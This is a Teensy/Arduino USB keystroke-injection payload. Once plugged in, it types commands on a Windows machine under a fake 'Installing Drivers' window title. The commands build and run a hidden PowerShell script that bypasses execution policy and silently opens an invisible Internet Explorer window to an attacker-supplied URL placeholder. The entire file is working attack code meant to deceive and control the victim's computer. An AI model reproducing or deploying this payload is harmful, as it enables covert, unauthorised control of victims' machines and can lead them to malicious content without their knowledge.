#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);
  
  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  
  Keyboard.println("echo $ie = new-object -comobject \"InternetExplorer.Application\" > %temp%\\bs.ps1");
  Keyboard.println("echo $ie.visible = $false >> %temp%\\bs.ps1");
  Keyboard.println("echo $ie.navigate(\"INPUT0\") >> %temp%\\bs.ps1");
  
   
  delay(2000);
  
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\bs.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\bs.ps1\"),0,true >> %temp%\\bs.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\bs.vbs");
  delay(3000);
  
  Keyboard.println("exit");

}

void loop(){
}

DEFS